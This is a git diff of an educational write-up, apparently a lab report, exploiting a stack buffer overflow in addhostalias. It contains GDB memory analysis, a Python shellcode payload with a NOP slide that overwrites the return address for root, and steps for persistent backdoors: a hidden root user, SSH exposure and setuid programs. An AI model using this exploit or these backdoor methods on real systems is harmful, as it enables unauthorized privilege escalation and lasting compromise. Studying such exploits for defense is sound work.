@@ -42,19 +42,26 @@ buffer and execute the string as if it was some code.
 Using GDB, we can verify that the stack is override. First, we run
 `gdb /usr/bin/addhostalias`, then `break fopen` since it is the next
 function call after our buffer overflow. Next,
-```run `python -c "print '3'*50"` x y```. Finally, we can check the
-stack content with `x/50x $sp`.
+```run `python -c "print '3'*250"` D U```. The array is filled using the
+first variable, a tab, the second variable, a tab, the third variable,
+a new line and a null byte.
+`3` encoded in ASCII is 0x33 in hexadecimal, `D` is 0x44 and `U` 0x55,
+so looking at the stack content with `x/100x $sp` we know that the array
+should end with `... 33 33 33 09 44 09 55 0a 00`.
 
 ![Stack content](./assets/stack_content.png)
 
-`3` encoded in ASCII is 0x33 in hexadecimal, hence all these 33.
-However, using the memory layout above, we can see that the saved frame
-pointer is 0x08048241 and the the return address 0x40007099. We can also
-see that the location in the stack is near 0xbffffb40, so we will jump
-a bit earlier to make sure we aim correctly. Because of some environment
-variables, this address could indeed change slightly.
+Using the memory layout above, we can see that the saved frame
+pointer is 0xbffffbac and the the return address 0x08048656. This is
+also reported by GDB using `info frame`.
 
-![Stack content with highlights](./assets/stack_content_highlighted.jpg)
+![Frame info](./assets/frame_info.png)
+
+![Stack content with highlights](./assets/stack_content_highlighted.png)
+
+Using these informations, it means that we need to change the value at
+0xbffffb90 from 0x08048656 (our previous return value) to somewhere
+inside our buffer, like 0xbffffaa0.
 
 Now, if we input 256 characters, plus 4 characters for the frame
 pointer, we should be able to overwrite the return address to return in
@@ -80,22 +87,32 @@ shellcode = ("\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80"
             +"\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90"
             +"\x90\x90\x90\x90\x90\x90\x90\x90\x90")
 
-nopSlide = "\x90" * (256 - len(shellcode))
-newAddr = "\xe0\xfa\xff\xbf"
+nopSlide = "\x90" * (256 + 4 - len(shellcode))
+newAddr = "\xa0\xfa\xff\xbf"
 
-print "x", "y", nopSlide + shellcode + newAddr
+print nopSlide + shellcode + newAddr, "3", "D"
 ```
 
 And, with it, we can finally get root access.
 
 ![Root access](./assets/root_access.png)
 
+The return address has been override to the stack.
+
+![Address override](./assets/address_override.png)
+
 ## 1.3 - Permanent root access
 
 Althouh this root access is limited in time, we can easily make it
 permanent with a backdoor. With root access, you can create a new user
-with root access and a known password, expose a SSH access, create a
-file with sticky flag, etc.
+with root access and a known password and expose a SSH access.
+
+It is also possible to create a program with the set-user-ID bit. With
+this flag enabled, the program will run as root even if it is started as
+a regular user. So, even if this buffer overflow get patched, you still
+have access to the created program with the set-user-ID bit and can
+still possibly open a root terminal and abuse the system from the
+inside, without having any root permission whatsoever.
 
 # 2 - Countermeasures
 
